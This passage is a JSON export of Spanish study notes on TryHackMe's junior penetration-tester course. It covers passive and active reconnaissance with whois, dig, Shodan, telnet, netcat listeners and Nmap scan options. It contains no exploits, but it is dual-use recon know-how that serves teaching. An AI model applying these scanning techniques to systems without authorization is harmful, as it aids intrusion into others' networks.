(100.65.12.135)  0.390 ms 100.65.12.15 (100.65.12.15)  1.045 ms 100.65.14.15 (100.65.14.15)  1.036 ms  \n8  100.100.4.16 (100.100.4.16)  0.482 ms 100.100.20.122 (100.100.20.122)  0.795 ms 100.95.2.143 (100.95.2.143)  0.827 ms  \n9  100.100.20.86 (100.100.20.86)  0.442 ms 100.100.4.78 (100.100.4.78)  0.347 ms 100.100.20.20 (100.100.20.20)  1.388 ms \n10  100.92.212.20 (100.92.212.20)  11.611 ms 100.92.11.54 (100.92.11.54)  12.675 ms 100.92.11.56 (100.92.11.56)  10.835 ms \n11  100.92.6.52 (100.92.6.52)  11.427 ms 100.92.6.50 (100.92.6.50)  11.033 ms 100.92.210.50 (100.92.210.50)  10.551 ms \n12  100.92.210.139 (100.92.210.139)  10.026 ms 100.92.6.13 (100.92.6.13)  14.586 ms 100.92.210.69 (100.92.210.69)  12.032 ms \n13  100.92.79.12 (100.92.79.12)  12.011 ms 100.92.79.68 (100.92.79.68)  11.318 ms 100.92.80.84 (100.92.80.84)  10.496 ms \n14  100.92.9.27 (100.92.9.27)  11.354 ms 100.92.80.31 (100.92.80.31)  13.000 ms 52.93.135.125 (52.93.135.125)  11.412 ms \n15  150.222.241.85 (150.222.241.85)  9.660 ms 52.93.135.81 (52.93.135.81)  10.941 ms 150.222.241.87 (150.222.241.87)  16.543 ms \n16  100.92.228.102 (100.92.228.102)  15.168 ms 100.92.227.41 (100.92.227.41)  10.134 ms 100.92.227.52 (100.92.227.52)  11.756 ms \n17  100.92.232.111 (100.92.232.111)  10.589 ms 100.92.231.69 (100.92.231.69)  16.664 ms 100.92.232.37 (100.92.232.37)  13.089 ms \n18  100.91.205.140 (100.91.205.140)  11.551 ms 100.91.201.62 (100.91.201.62)  10.246 ms 100.91.201.36 (100.91.201.36)  11.368 ms \n19  100.91.205.79 (100.91.205.79)  11.112 ms 100.91.205.83 (100.91.205.83)  11.040 ms 100.91.205.33 (100.91.205.33)  10.114 ms \n20  100.91.211.45 (100.91.211.45)  9.486 ms 100.91.211.79 (100.91.211.79)  13.693 ms 100.91.211.47 (100.91.211.47)  13.619 ms \n21  100.100.6.81 (100.100.6.81)  11.522 ms 100.100.68.70 (100.100.68.70)  10.181 ms 100.100.6.21 (100.100.6.21)  11.687 ms \n22  100.100.65.131 (100.100.65.131)  10.371 ms 100.100.92.6 (100.100.92.6)  10.939 ms 100.100.65.70 (100.100.65.70)  23.703 ms \n23  100.100.2.74 (100.100.2.74)  15.317 ms 100.100.66.17 (100.100.66.17)  11.492 ms 100.100.88.67 (100.100.88.67)  35.312 ms \n24  100.100.16.16 (100.100.16.16)  19.155 ms 100.100.16.28 (100.100.16.28)  19.147 ms 100.100.2.68 (100.100.2.68)  13.718 ms \n25  99.83.89.19 (99.83.89.19)  28.929 ms *  21.790 ms \n26  104.26.11.229 (104.26.11.229)  11.070 ms  11.058 ms  11.982 ms\n```\n\nEsto son las dos respuestas de `traceroute` del mismo dominio efectuados seguidos. Vemos que cambia.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Telnet",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/2-active-reconnaissance/5-telnet/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/2. Active Reconnaissance/5. Telnet.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 2. Active Reconnaissance",
    "content": "El protocolo TELNET (Teletype Network) fue desarrollado en 1969 para comunicarse con un sistema remoto v√≠a CLI. Por esto, el comando `telnet` usa el protocolo TELNET para administraci√≥n remota. Su puerto por defecto en el 23. Manda toda la informaci√≥n en texto plano. La alternativa segura es SSH.\n\nSin embargo, el cliente de telnet puede ser usado para otros prop√≥sitos. Sabiendo que el cliente de telnet depende del protocolo TCP, puedes usarlo para conectarte a cualquier servicio y coger su banner. Usando el comando `telnet <IP> <PUERTO>` puedes conectarte a cualquier servicio TCP e incluso intercambiar algunos mensajes a no ser que use encriptaci√≥n.\n\nDigamos que queremos conectarnos a un servidor web que escucha en el puerto 80. Podemos conectarnos a √©l y comunicarnos mediante el protocolo HTTP. S√≥lo necesitamos ejecutar un `GET / HTTP/1.1`. Para especificar una p√°gina en concreto la especificamos as√≠: `GET /index.html HTTP/1.1`.\n\n>[!CAUTION] Para que no te de error deber definir un nombre para host, por ejemplo `host: example` y darle a Enter dos veces.\n\n```shell\npentester@TryHackMe$ telnet MACHINE_IP 80 \nTrying MACHINE_IP... \nConnected to MACHINE_IP. \nEscape character is '^]'. \nGET / HTTP/1.1 \nhost: telnet  \n\nHTTP/1.1 200 OK \nServer: nginx/1.6.2 \nDate: Tue, 17 Aug 2021 11:13:25 GMT \nContent-Type: text/html \nContent-Length: 867 \nLast-Modified: Tue, 17 Aug 2021 11:12:16 GMT \nConnection: keep-alive \nETag: \"611b9990-363\" \nAccept-Ranges: bytes    \n\n...\n```\n\nEs de nuestro particular inter√©s el servidor y la versi√≥n del servicio, en nuestro caso ha respondido con `Server: nginx/1.6.2`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Putting It All Together",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/2-active-reconnaissance/7-putting-it-all-together/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/2. Active Reconnaissance/7. Putting It All Together.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 2. Active Reconnaissance",
    "content": "En esta unidad hemos cubierto varias herramientas desde `ping` y `traceroute` hasta `telnet` y `nc`. En las siguientes unidades estudiaremos Nmap.\n\n| Comando          | Ejemplo                                    |\n| ---------------- | ------------------------------------------ |\n| ping             | `ping -c 10 10.10.55.97` on Linux or macOS |\n| ping             | `ping -n 10 10.10.55.97` on MS Windows     |\n| traceroute       | `traceroute 10.10.55.97` on Linux or macOS |\n| tracert          | `tracert 10.10.55.97` on MS Windows        |\n| telnet           | `telnet 10.10.55.97 PORT_NUMBER`           |\n| netcat as client | `nc 10.10.55.97 PORT_NUMBER`               |\n| netcat as server | `nc -lvnp PORT_NUMBER`                     |\n\n| Operating System    | Developer Tools Shortcut |\n| ------------------- | ------------------------ |\n| Linux or MS Windows | `Ctrl+Shift+I`           |\n| macOS               | `Option + Command + I`   |",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Active Reconnaissance",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/2-active-reconnaissance/0-active-reconnaissance/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/2. Active Reconnaissance/0. Active Reconnaissance.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 2. Active Reconnaissance",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/2. Active Reconnaissance/1. Introduction]]\n[[2. Web Browser]]\n[[3. Ping]]\n[[4. Traceroute]]\n[[5. Telnet]]\n[[6. Netcat]]\n[[7. Putting It All Together]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Netcat",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/2-active-reconnaissance/6-netcat/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/2. Active Reconnaissance/6. Netcat.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 2. Active Reconnaissance",
    "content": "Netcat, o simplemente `nc` tiene diferentes aplicaciones que pueden ser de gran valor para un pentester. Netcat soporta TCP y UDP. Puede funcionar como cliente o como servidor.\n\nPrimero, puedes conectarte al servidor como lo hiciste con Telnet, para recolectar su banner con `nc <IP> <PUERTO>`.\n\n>[!NOTE] Puede que tengas que presionar `Shift+Enter` despu√©s de la l√≠nea `GET`.\n\n```shell\npentester@TryHackMe$ nc 10.10.55.97 80 \nGET / HTTP/1.1 \nhost: netcat  \n\nHTTP/1.1 200 OK \nServer: nginx/1.6.2 \nDate: Tue, 17 Aug 2021 11:39:49 GMT \nContent-Type: text/html \nContent-Length: 867 \nLast-Modified: Tue, 17 Aug 2021 11:12:16 GMT \nConnection: keep-alive \nETag: \"611b9990-363\" \nAccept-Ranges: bytes \n\n...\n```\n\nSi lo que queremos es hacer que sea un servidor, podemos hacerlo con la sintaxis: `nc -lp 1234` o incluso mejor `nc -vnlp 1234`. El orden de las letras no importa siempre y cuando el puerto sea precedido de `-p`.\n\n| Opci√≥n | Significado                                               |\n| ------ | --------------------------------------------------------- |\n| -l     | Modo de escucha.                                          |\n| -p     | Especifica el puerto.                                     |\n| -n     | S√≥lo direcciones IP, no aplica resoluci√≥n DNS.            |\n| -v     | Output verbose.                                           |\n| -vv    | Output muy verbose.                                       |\n| -k     | Sigue escuchando despu√©s de que se desconecte el cliente. |",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Passive Reconnaissance",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/1-passive-reconnaissance/0-passive-reconnaissance/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/1. Passive Reconnaissance/0. Passive Reconnaissance.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 1. Passive Reconnaissance",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/1. Passive Reconnaissance/1. Introduction]]\n[[2. Passive Versus Active Recon]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/1. Passive Reconnaissance/3. Whois]]\n[[4. nslookup and dig]]\n[[5. DNSDumpster]]\n[[6. Shodan.io]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/1. Passive Reconnaissance/7. Summary]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/1-passive-reconnaissance/1-introduction/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/1. Passive Reconnaissance/1. Introduction.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 1. Passive Reconnaissance",
    "content": "En este tema, despu√©s de definir el reconocimiento pasivo y activo, nos enfocaremos en las herramientas esenciales relaciondas al reconocimiento pasivo. Aprenderemos las herramientas:\n\n- `whois` para hacer peticiones a servidores WHOIS.\n- `nslookup` para hacer peticiones a servidores DNS.\n- `dig` para hacer peticiones a servidores DNS.\n\nTodos estos servidores son p√∫blicos y no alertan al objetivo. Tambi√©n aprenderemos a usar los siguientes servicios online:\n\n- DNSDumpster\n- Shodan.io\n\nEstos dos nos permiten recolectar informaci√≥n sobre nuestro objetivo sin conectarnos directamente a √©l.\n\n--------------------------------\n<h2>Pre-requisitos</h2>\n- [[2. Network Fundamentals]]\n- [[4. Linux Fundamentals]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Summary",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/1-passive-reconnaissance/7-summary/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/1. Passive Reconnaissance/7. Summary.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 1. Passive Reconnaissance",
    "content": "En esta lecci√≥n hemos aprendido sobre el reconocimiento pasivo. En particular hemos visto las herramientas de linea de comandos `whois`, `nslookup` y `dig` y las herramientas online `DNSDumpster` y `Shodan.io`.\n\n| Prop√≥sito                                      | Ejemplo CLI                               |\n| ---------------------------------------------- | ----------------------------------------- |\n| Consultar registros WHOIS                      | `whois tryhackme.com`                     |\n| Consultar registros DNS A                      | `nslookup -type=A tryhackme.com`          |\n| Consultar registros  DNS MX en un servidor DNS | `nslookup -type=MX tryhackme.com 1.1.1.1` |\n| Consultar registros DNS TXT                    | `nslookup -type=TXT tryhackme.com`        |\n| Consultar registros DNS A                      | `dig tryhackme.com A`                     |\n| Consultar registros DNS MX  en un servidor DNS | `dig @1.1.1.1 tryhackme.com MX`           |\n| Consultar registros TXT                        | `dig tryhackme.com TXT`                   |",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. DNSDumpster",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/1-passive-reconnaissance/5-dnsdumpster/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/1. Passive Reconnaissance/5. DNSDumpster.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 1. Passive Reconnaissance",
    "content": "Las heramientas de consulta de DNS, como lookup y dig, no pueden encontrar subdominios por s√≠ mismas. El dominio que est√°s inseccionando puede incluir un subdominio diferente que puede revelar mucha informaci√≥n. La pregunta entonces es, ¬øc√≥mo podemos encontrar esos subdominios?\n\nPodemos considerar usar m√∫ltiples motores de b√∫squeda para compilar una lista de subdominios p√∫blicos. Un s√≥lo motor de b√∫squeda no ser√° suficiente. Adem√°s, deber√≠amos esperar tener que buscar entre decenas de resultados antes de encontrar algo interesante. Otro acercamiento para conseguir el mismo prop√≥sito ser√≠a mediante fuerza bruta con herramientas que ya vimos como gobuster o ffuf.\n\nPara evitar una b√∫squeda que consuma tanto tiempo, uno puede usar un servicio online que ofrezca respuestas detalladas a queries DNS, como [DNSDumpster](https://dnsdumpster.com/). Esta herramienta nos devolver√° la informaci√≥n DNS recolectada en tablas f√°ciles de leer.\n\nVamos a buscar `tryhackme.com` en DNSDumpster para ver c√≥mo funciona.\n\nEntre los resultados, tenemos una lista de servidores DNS para el dominio buscado. Tambi√©n resolvi√≥ los nombres de dominio a direcciones IP y trat√≥ de geolocalizarlos. Tambi√©n podemos ver los registros MX con sus respectivas IPs. Por √∫ltimo podemos ver los registros txt.\n\n![[Pasted image 20251117141617.png]]\n\nDNSDumpster tambi√©n representa la informaci√≥n recolectada gr√°ficamente. DNSDumpster muestra la informaci√≥n de la tabla como un gr√°fico.\n\n![[Pasted image 20251117141728.png]]\n\nHay una funcionalidad en beta que permite exportar el gr√°fico. Luego puedes manipularlo y mover bloques.\n\n![[Pasted image 20251117141814.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Passive Versus Active Recon",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/1-passive-reconnaissance/2-passive-versus-active-recon/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/1. Passive Reconnaissance/2. Passive Versus Active Recon.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 1. Passive Reconnaissance",
    "content": "Antes de la era de los ordenadores, sistemas y redes, Sun Tzu escribi√≥ en \"El Arte de la Guerra\", \"Si conoces a tu enemigo y te conoces a ti mismo, tu victoria no ser√° una duda\". Si est√°s jugando el rol de atacante, necesitas recolectar informaci√≥n de los sistemas objetivos. Si juegas el rol de defensor, necesitas saber lo que tu adversario encontrar√° sobre tus sistemas y redes.\n\nEl reconocimiento puede ser definido como la encuesta preeliminar para recolectar informaci√≥n sobre un objetivo. Es el primer paso en \"Te Unified Kill Chain\" para ganar acceso inicial al sistema. Dividimos el reconocimiento en dos:\n\n1. Reconocimiento pasivo.\n2. Reconocimiento activo.\n\n---------------------------------------\n<h2>Reconocimiento Pasivo</h2>\nConf√≠as en conocimiento disponible p√∫blicamente. Es el conocimiento al que puedes acceder desde recursos disponibles p√∫blicamente sin interactuar directamente con el objetivo. Piensa en ello como mirar desde lejos a territorio enemigo con unos prism√°ticos.\n\nLas actividades de este tipo de conocimiento incluyen:\n\n- Comprobar registros DNS de un dominio desde un servidor DNS p√∫blico.\n- Comprobar anuncios de trabajo de la compa√±ia.\n- Leer las noticias sobre el objetivo.\n\n-----------------------------------\n<h2>Reconocimiento Activo</h2>\nPor el otro lado, el reconocimiento activo no puede ser conseguido de manera tan discreta. Requiere una interacci√≥n directa con el objetivo. Piensa en ello como comprobar las cerraduras de puertas y ventanas, entre otros puntos de entrada.\n\nAlgunos ejemplos incluyen:\n\n- Conectarse a uno de los servidores de la compa√±√≠a como HTTP, FTP o SMTP.\n- Llamar a la compa√±√≠a en un intento de obtener informaci√≥n (ingenier√≠a social).\n- Entrar a las inmediaciones de la empresa pretendiendo ser un agente de reparaci√≥n/mantenimiento.\n\nConsiderando la naturaleza invasiva de este tipo de reconocimiento, uno se puede meter en problemas legales r√°pidamente sin la autorizaci√≥n corresponddiente.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Shodan.io",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/1-passive-reconnaissance/6-shodan-io/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/1. Passive Reconnaissance/6. Shodan.io.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 1. Passive Reconnaissance",
    "content": "Cuando se te encarga un pentest contra objetivos espec√≠ficos, como parte del reconocimiento pasivo, un servicio como [Shodan.io](https://www.shodan.io/) puede resultar de ayuda para aprender varia informac√≥n sobre la red del cliente, sin conectarte a ella activamente. Adem√°s, en el lado defensivo, puedes usar servicios diferentes de Shodan.io para aprender sobre dispositivos conectados y expuestos en tu organizaci√≥n.\n\nShodan.io intenta conectarse a cada dispositivo alcanzable online pata construir un motor de b√∫squeda de cosas conectadas, en contraste a un buscador de p√°ginas. Una vez que recibe una respuesta, recolecta toda la informaci√≥n relacionada con el servicio y lo guarda en una base de datos para hacerlo m√°s \"buscable\". Veamos el registro guardado de uno de los servidores de tryhackme.com.\n\n![[Pasted image 20251117142632.png]]\n\nEste registro muestra un servidor web. Sin embargo, Shodan.io recolecta toda la informaci√≥n relacionada a cualquier dispositivo que puede encontrar conectado online. Buscar `tryhackme.com` en Shodan.io, mostrar√° al menos el registro mostrado en la captura de pantalla de arriba. V√≠a este resultado, podemos aprender varias cosas relacionadas con nuestra b√∫squeda, como:\n\n- Direcci√≥n IP\n- Compa√±√≠a hosteadora\n- Localizaci√≥n geogr√°fica\n- Tipo de servidor y versi√≥n",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Whois",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/1-passive-reconnaissance/3-whois/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/1. Passive Reconnaissance/3. Whois.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 1. Passive Reconnaissance",
    "content": "WHOIS es un protocolo de peticiones y respuestas que sigue la especificaci√≥n [RFC 3912](https://www.ietf.org/rfc/rfc3912.txt). Un servidor WHOIS escucha en el puerto 43 TCP por conexiones entrantes. El registrador ddel dominio es responsable de mantener los registros WHOIS para los nombres de dominio para nos que posee. El servidor WHOIS responde con varia informaci√≥n relacionada al dominio pedido, como por ejemplo:\n\n- Registrador: V√≠a por la cual fue registrado el dominio.\n- Informaci√≥n de Contacto del registrador: Nombre, organizaci√≥n, direcci√≥n, tel√©fono, entre otras cosas (a no ser que sea ocultado expl√≠citamente mediante la configuraci√≥n).\n- Fechas de creaci√≥n, actualizaci√≥n y expiraci√≥n: Cuando se registro/actualiz√≥ el dominio y cuando se liberar√°.\n- Nombre del Servidor: A qu√© servidor preguntar para la resoluci√≥n DNS.\n\nPara conseguir esta informaci√≥n debemos usar `whois` como cliente o servicio online. La sintaxis es `whois <NOMBRE_DOMINIO>`.\n\n```shell\nuser@TryHackMe$ whois tryhackme.com \n[Querying whois.verisign-grs.com] \n[Redirected to whois.namecheap.com] \n[Querying whois.namecheap.com] \n[whois.namecheap.com] \nDomain name: tryhackme.com \nRegistry Domain ID: 2282723194_DOMAIN_COM-VRSN \nRegistrar WHOIS Server: whois.namecheap.com \nRegistrar URL: http://www.namecheap.com \nUpdated Date: 2021-05-01T19:43:23.31Z \nCreation Date: 2018-07-05T19:46:15.00Z \nRegistrar Registration Expiration Date: 2027-07-05T19:46:15.00Z \nRegistrar: NAMECHEAP INC \nRegistrar IANA ID: 1068 \nRegistrar Abuse Contact Email: abuse@namecheap.com \nRegistrar Abuse Contact Phone: +1.6613102107 \nReseller: NAMECHEAP INC \nDomain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited \nRegistry Registrant ID:  \nRegistrant Name: Withheld for Privacy Purposes \nRegistrant Organization: Privacy service provided by Withheld for Privacy ehf \n[...] \nURL of the ICANN WHOIS Data Problem Reporting System: http://wdprs.internic.net/ \n>>> Last update of WHOIS database: 2021-08-25T14:58:29.57Z <<< \nFor more information on Whois status codes, please visit https://icann.org/epp\n```\n\nPodemos ver mucha informaci√≥n. Primero vemos que somos redirigidos a `whois.namecheap.com` para recoger nuestra informaci√≥n. En nuestro caso, `namecheap.com` mantiene el registro WHOIS para este nombre de dominio. Adem√°s, podemos ver la fecha de creaci√≥n junto con la √∫ltima actualizaci√≥n y la fecha de expiraci√≥n.\n\nDespu√©s, obtenemos informaci√≥n sobre el registrador y el registrante. Podemos encontrar nombre e informaci√≥n de contacto. Finalmente vemos el nombre de los servidores de dominio que debemos consultar si tenemos alg√∫n regitro DNS que mirar.\n\nLa informaci√≥n recolectada puede ser inspeccionada para encontrar nuevas superficies de ataque como ingenier√≠a social o ataques t√©cnicos.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. nslookup and dig",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/1-passive-reconnaissance/4-nslookup-and-dig/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/1. Passive Reconnaissance/4. nslookup and dig.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 1. Passive Reconnaissance",
    "content": "En la tarea anterior vimos c√≥mo usar WHOIS para obtener informaci√≥n varia sobre los dominios que est√°bamos mirando. En particular, fuimos capaces de obtener los servidores DNS del registrador. \n\nPara encontrar la IP de un dominio usamos `nslookup`, que significa Name Server Look Up. Necesitas usar el comando `nslookup DOMAIN_NAME` o `nslookup OPCION DOMAIN_NAME SERVER`. Estos tres par√°metros son:\n\n- OPCION: Contiene el tipo de query como se muestra en la tabla de abajo. Por ejemplo, puedes usar `A` para direcciones IPv4 y `AAAA` para direcciones IPv6.\n- DOMAIN_NAME: Es el nombre del dominio que estamos consultando.\n- SERVER: Es el servidor DNS al que queremos hacer la query. Puedes elegir cualquier servidor DNS p√∫blico como CludFlare (`1.1.1.1`), Google (`8.8.8.8`), Quad9 (`9.9.9.9`) y [m√°s](https://duckduckgo.com/?q=public+dns).\n\n|Query type|Result|\n|---|---|\n|A|IPv4 Addresses|\n|AAAA|IPv6 Addresses|\n|CNAME|Canonical Name|\n|MX|Mail Servers|\n|SOA|Start of Authority|\n|TXT|TXT Records|\n\nPor ejemplo, `nslookup -type=A tryhackme.com 1.1.1.1`, puede ser usado para devolver todas las direcciones IPv4 usadas por tryhackme.com.\n\n```shell\nuser@TryHackMe$ nslookup -type=A tryhackme.com 1.1.1.1\nServer:\t\t1.1.1.1\nAddress:\t1.1.1.1#53\n\nNon-authoritative answer:\nName:\ttryhackme.com\nAddress: 172.67.69.208\nName:\ttryhackme.com\nAddress: 104.26.11.229\nName:\ttryhackme.com\nAddress: 104.26.10.229\n```\n\nLos registros A y AAAA se usan para devolver direcciones IPv4 e IPv6 respectivamente. Digamos que quieres averiguar los servidores d eemail y configuraciones para un dominio, pues: `nslookup -type=MX tryhackme.com`\n\n```shell\nuser@TryHackMe$ nslookup -type=MX tryhackme.com \nServer:\t\t127.0.0.53 \nAddress:\t127.0.0.53#53  \n\nNon-authoritative answer: \ntryhackme.com\tmail exchanger = 5 alt1.aspmx.l.google.com. \ntryhackme.com\tmail exchanger = 1 aspmx.l.google.com. \ntryhackme.com\tmail exchanger = 10 alt4.aspmx.l.google.com. \ntryhackme.com\tmail exchanger = 10 alt3.aspmx.l.google.com. \ntryhackme.com\tmail exchanger = 5 alt2.aspmx.l.google.com.\n```\n\nPodemos ver que el email actual de tryhackme.com usa Google. Como MX est√° mirando los Mail Exchange servers, podemos ver que cuando un servidor de mail intenta entregar un email `@tryhackme.com`, intentar√° conectarse a `aspmx.l.google.com`, lo que tiene orden 1.  Si est√° ocupado o no disponible, se intentar√° conectar al siguiente en la lista de orden, en este caso `alt1.aspmx.l.google.com` y `alt2.aspmx.l.google.com`.\n\nGoogle ofrece servidores de mail listados, por lo tanto, no deber√≠amos esperar que los servidores de email corrieran una versi√≥n vulnerable. Sin embargo, en otros casos podemos encontrar servidores que no est√°n correctamente securizados o parcheados.\n\nPuedes repetir queries similares con diferentes tipos como `-type=txt`.\n\nPara m√°s queries DNS avanzadas y funcionalidades, puedes usar el comando `dig`, acr√≥nimo de \"Domain Information Groper\". Usemos `dig` para mirar los registros MX y compararlos con `nslookup`. Podemos usar `dig DOMAIN_NAME` pero para especificar el tipo de registro, usar√≠amos `dig DOMAIN_NAME TYPE`. De forma opcional, podemos seleccionar el servidor al que queremos hacer la query usando `dig @SERVER DOMAIN_NAME TYPE`.\n\n- SERVER: Es el servidor DNS al que haremos la consulta.\n- DOMAIN_NAME: Es el nombre de dominio que estamos buscando.\n- TYPE: Contiene el registro DNS como se muestra en la tabla de antes.\n\n```shell\nuser@TryHackMe$ dig tryhackme.com MX\n\n; <<>> DiG 9.16.19-RH <<>> tryhackme.com MX\n;; global options: +cmd\n;; Got answer:\n;; ->>HEADER<\n```\n\nUna comparaci√≥n r√°pida entre el output de `nslookup` y el de `dig` muestra que `dig` devolvi√≥ m√°s informaci√≥n, como el TTL. Si quieres hacer una query al servidor DNS `1.1.1.1`, puedes ejecutar `dig @1.1.1.1 tryhackme.com MX`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/6-nmap-post-port-scans/1-introduction/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/6. Nmap Post Port Scans/1. Introduction.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 6. Nmap Post Port Scans",
    "content": "Esta unidad es la √∫ltima de la serie de 4 que tratan sobre Nmap. En esta, nos centraremos en los pasos posteriores al escaneo de puertos, en particular, la detecci√≥n de servicios, de sistema operativo, el motor de scripting de Nmap y guardar los resultados del escaneo.\n\n1. [[0. Nmap Live Host Discovery]]\n2. [[0. Nmap Basic Port Scans]]\n3. [[0. Nmap Advanced Port Scans]]\n4. [[0. Nmap Post Port Scans]]\n\nEn esta unidad veremos c√≥mo usar Nmap para:\n\n- Detectar versiones de los servicios que corren.\n- Detectar el sistema operativo basado en cualquier se√±al revelada por el objetivo.\n- Correr el traceroute de Nmap.\n- Correr scripts espec√≠ficos de Nmap.\n- Guardar el resultado de los escaneos.\n\n![[Pasted image 20251120171423.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Summary",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/6-nmap-post-port-scans/6-summary/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/6. Nmap Post Port Scans/6. Summary.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 6. Nmap Post Port Scans",
    "content": "En esta unidad hemos aprendido a detectar servicios, sus versiones y el sistema operativo del objetivo. Tambi√©n hemos aprendido c√≥mo habilitar la traceroute y c√≥mo usar uno o m√°s scripts. Por √∫ltimo hemos visto los formatos en los que podemos guardar los resultados de nmap.\n\n| Opci√≥n                      | Significado                                           |\n| --------------------------- | ----------------------------------------------------- |\n| `-sV`                       | Determina el servicio/versi√≥n en el puerto            |\n| `-sV --version-light`       | Prueba los escaneos m√°s probables                     |\n| `-sV --version-all`         | Prueba todos los escaneos                             |\n| `-O`                        | Detecta el Sistema Operativo                          |\n| `--traceroute`              | Ejecuta la traceroute al objetivo                     |\n| `--script=SCRIPTS`          | Selecciona los scripts a ejecutar                     |\n| `-sC` or `--script=default` | Ejecuta scripts por defecto                           |\n| `-A`                        | Equivalente a `-sV -O -sC --traceroute`               |\n| `-oN`                       | Guarda la salida en formato normal                    |\n| `-oG`                       | Guarda la salida en formato grepeable                 |\n| `-oX`                       | Guarda la salida en formato XML                       |\n| `-oA`                       | Guarda la salida en formato normal, XML and Grepeable |",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. OS Detection and Traceroute",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/6-nmap-post-port-scans/3-os-detection-and-traceroute/",
